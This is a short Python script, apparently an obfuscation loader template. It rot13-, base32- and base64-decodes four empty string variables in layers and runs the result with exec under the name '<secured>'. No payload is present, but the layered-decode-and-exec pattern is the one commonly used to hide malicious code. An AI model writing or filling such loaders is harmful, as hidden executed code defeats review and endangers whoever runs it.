
import base64, codecs

magic = ''
love = ''
god = ''
destiny = ''
joy = '\x72\x6f\x74\x31\x33'

exec(compile(
    base64.b64decode(
        codecs.decode(
            base64.b32decode(
                (codecs.decode(magic, joy) + codecs.decode(love, joy) + 
                 codecs.decode(god, joy) + codecs.decode(destiny, joy)
                ).encode("utf-8")
            ).decode("utf-8"),
            joy
        ).encode("utf-8")
    ).decode("utf-8"),
    "<secured>", "exec"
))
